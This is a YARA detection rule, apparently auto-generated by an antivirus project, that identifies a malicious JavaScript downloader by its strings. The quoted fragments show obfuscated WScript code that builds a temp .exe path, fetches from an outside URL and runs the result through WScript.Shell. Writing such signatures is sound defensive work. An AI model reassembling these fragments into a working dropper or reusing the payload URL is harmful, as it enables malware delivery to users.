rule sig_20160328_76f249a540093d088694deb5584977b6 {
  meta:
    description = "datamaliciousorder - file 20160328_76f249a540093d088694deb5584977b6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2888e1d9062a76f48e4a6ed58d59bd02d4348cf5787c8b7c1833e76b5d95faf5"

  strings:
    $s1  = "function Eosnlwfszg() {return Lyachwtjbu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"mDkxvf3KN.exe\";};" fullword ascii
    $s2  = "Jldiitnxy[Hyvwytir](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Orqkt](Cfvoto() * 11)} while (Jldiitnxy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Lyachwtjbu = function Vzyvmq() {return WScript[Mvofetnt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dxxensvajb(Wdiioldkm, Jnhrry){return Wdiioldkm - Jnhrry;};" fullword ascii
    $s6  = "function Zzhtaetv() {return ((Vlrir == true) && (Vlrir == Zzytdqgxr)) ? 1 : Uydtkz;};" fullword ascii
    $s7  = "function Ybwhtjqxbz(Ipeqlqzzrf){Lyachwtjbu[\"Run\"](Ipeqlqzzrf, Uydtkz, Uydtkz);};" fullword ascii
    $s8  = "var Vlrir = false;" fullword ascii
    $s9  = "function Qppdrnrja()" fullword ascii
    $s10 = "function Ekfawdxpi(){return Mvofetnt;};" fullword ascii
    $s11 = " while (Stdgiakooc){" fullword ascii
    $s12 = "Vlrir = true; " fullword ascii
    $s13 = "var Ursntgzovi = false;" fullword ascii
    $s14 = "var Zzytdqgxr = false;" fullword ascii
    $s15 = "return Dxxensvajb(Xulodtltcm, Eydgyyy);" fullword ascii
    $s16 = "var Qauvkxu = new this[\"Date\"]();" fullword ascii
    $s17 = "function Cfvoto(){return 22;};" fullword ascii
    $s18 = "Zzytdqgxr = true; " fullword ascii
    $s19 = "function Kgehfp(){return Qaiawd;};" fullword ascii
    $s20 = "function Dzigutujo(Qonbtozg) {var Kcchbkov = (1, 2, 3, 4, 5, Qonbtozg); return Kcchbkov;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}